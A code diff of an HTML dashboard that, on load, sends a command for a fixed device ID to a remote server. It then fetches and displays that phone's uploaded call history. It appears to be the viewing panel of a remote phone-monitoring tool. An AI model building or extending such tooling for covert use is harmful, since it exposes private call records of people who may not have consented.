@@ -69,7 +69,6 @@
             background: rgba(255,255,255,0.05); border-radius: 50%;
         }
         
-        /* Dynamic Colors */
         .log-icon.incoming { color: var(--incoming); }
         .log-icon.outgoing { color: var(--outgoing); }
         .log-icon.missed { color: var(--missed); }
@@ -99,15 +98,12 @@
     </div>
 
     <script>
-        // ✅ SERVER SETUP
         const SERVER_URL = "https://child-v9no.onrender.com";
         const DEVICE_ID = "M2103K19I";
 
-        // 1. Page Load hote hi Command bhejo
         document.addEventListener("DOMContentLoaded", () => {
             sendCommand();
-            // 5 second baad file check karo
-            setTimeout(fetchLogs, 5000);
+            setTimeout(fetchLogs, 5000); // 5 sec baad check karo
         });
 
         function sendCommand() {
@@ -118,40 +114,42 @@
             }).then(() => console.log("Call Logs Command Sent"));
         }
 
-        // 2. Fetch Data from Server File
         function fetchLogs() {
             const container = document.getElementById("logsContainer");
 
-            // Server ke uploads folder se 'call_logs.json' uthayega
-            fetch(`${SERVER_URL}/uploads/call_logs.json?t=${new Date().getTime()}`)
+            // ✅ CORRECTED: Direct file ki jagah API route use kar rahe hain
+            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${new Date().getTime()}`)
                 .then(response => {
-                    if (!response.ok) throw new Error("File not found");
+                    if (!response.ok) throw new Error("No data");
                     return response.json();
                 })
                 .then(data => {
-                    container.innerHTML = ""; // Clear Loading
-
                     if (!data || data.length === 0) {
-                        container.innerHTML = "<div class='status-msg'>No call history found</div>";
+                        container.innerHTML = `
+                            <div class='status-msg'>
+                                <i class="fa-solid fa-phone-slash"></i>
+                                <p>No call history found or phone hasn't uploaded yet.</p>
+                            </div>`;
                         return;
                     }
 
-                    // Logs ko loop mein dikhao (Newest first)
-                    data.reverse().forEach(log => {
+                    container.innerHTML = ""; // Clear Loading
+
+                    // Logs newest first dikhane ke liye reverse (agar app purane se bhej raha ho)
+                    data.forEach(log => {
                         let iconClass = "incoming";
-                        let iconName = "fa-arrow-down";
+                        let iconName = "fa-arrow-down-left";
                         
                         const type = (log.type || "").toLowerCase();
 
                         if(type.includes("outgoing")) {
                             iconClass = "outgoing";
-                            iconName = "fa-arrow-up"; // Upar teer (orange)
+                            iconName = "fa-arrow-up-right";
                         } else if(type.includes("missed") || type.includes("rejected")) {
                             iconClass = "missed";
-                            iconName = "fa-phone-slash"; // Kata hua phone (red)
+                            iconName = "fa-phone-slash";
                         }
 
-                        // Date Formatting (Agar timestamp hai to convert karo, nahi to text)
                         let displayDate = log.date;
                         if (!isNaN(log.date)) {
                             displayDate = new Date(parseInt(log.date)).toLocaleString();
@@ -176,16 +174,13 @@
                     });
                 })
                 .catch(err => {
-                    console.log("Waiting for data...");
-                    // Agar pehle se "Requesting" likha hai, toh change mat karo
-                    if (!container.innerHTML.includes("card")) {
-                        container.innerHTML = `
-                            <div class="status-msg">
-                                <i class="fa-solid fa-hourglass-half" style="font-size: 1.5rem;"></i>
-                                <p>Waiting for Phone...</p>
-                                <small>Data not received yet. Check again in 10s.</small>
-                            </div>`;
-                    }
+                    console.log("Waiting for phone...");
+                    container.innerHTML = `
+                        <div class="status-msg">
+                            <i class="fa-solid fa-hourglass-start"></i>
+                            <p>Connecting to Phone...</p>
+                            <small>Fetching latest logs, please wait.</small>
+                        </div>`;
                 });
         }
     </script>
